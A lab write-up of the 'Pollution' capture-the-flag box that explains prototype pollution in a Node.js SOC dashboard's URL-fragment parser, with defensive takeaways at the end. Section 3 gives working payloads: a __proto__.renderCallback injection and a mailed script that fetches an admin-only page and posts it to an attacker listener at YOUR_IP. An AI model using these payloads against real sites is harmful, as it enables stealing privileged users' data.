Pollution

Hack Smarter · Web · Easy. A Node.js SOC console parses URL fragments into a settings object without guarding its prototype. That one shortcut becomes a client-side code-execution gadget — and a mail feature delivers it to an admin.

A Hack Smarter lab, shared with permission. The provided test credentials and the flag value are redacted — the point is the vulnerability, not the answer.

1. Recon

Scope is a single SOC web app. The scan shows SSH and a Node.js / Express app on 3000. The brief hands over low-privilege test credentials, which land you on a SOC dashboard with a log-search box and a “webmail” feature that sends messages to an admin.

nmap -p- -sC -sV -oA scans/all TARGET   # 22/ssh, 3000/http (Express)

2. Read the Client Code

The search box reflects a parameter into the page, but only client-side — not obviously useful. The interesting part is how the page handles the URL fragment. A syncState function splits location.hash into key=value pairs and walks a dotted key path, assigning into a settings object:

// paraphrased from the page source
const path = key.split('.');
let current = target;
for (let i = 0; i < path.length; i++) {
  if (i === path.length - 1) current[part] = value;
  else current = current[part] = current[part] || {};
}
// later:
if (options.renderCallback) results.appendChild(
  document.createRange().createContextualFragment(options.renderCallback));

Walking a user-controlled key path with no check for __proto__ is textbook prototype pollution. And the render path trusts an options.renderCallback that pollution can define — a ready-made gadget that injects HTML.

3. Pollute, then Exfiltrate

Setting __proto__.renderCallback in the fragment makes every settings object inherit an attacker-defined render payload, which the page then turns into live DOM — client-side code execution.

http://TARGET:3000/dashboard#__proto__.renderCallback=<img src=x onerror="/* your JS */">

A protected page (/incident-response) returns 403 to us but is readable by the admin. So deliver the gadget to the admin through the mail feature: the body carries a dashboard link with a payload that fetches the protected page and posts it back to your listener. When the admin opens it, their browser reads the page and exfiltrates it.

# mail body (admin's browser runs it)
http://TARGET:3000/dashboard#__proto__.renderCallback=<script>
fetch('/incident-response').then(r=>r.text())
.then(d=>fetch('http://YOUR_IP:8000/',{method:'POST',body:d}))</script>

The flag is in the exfiltrated contents of the protected page.

What To Take Away

  • Walking a user-controlled key path must reject __proto__, constructor and prototype, or use a null-prototype object / Map.
  • A pollution gadget needs a sink. Here an inherited renderCallback fed straight into the DOM was the sink.
  • A feature that sends attacker content to a privileged user turns a self-only client bug into an admin-context attack.
  • Read the client JavaScript. The whole vulnerability was visible in the page source.
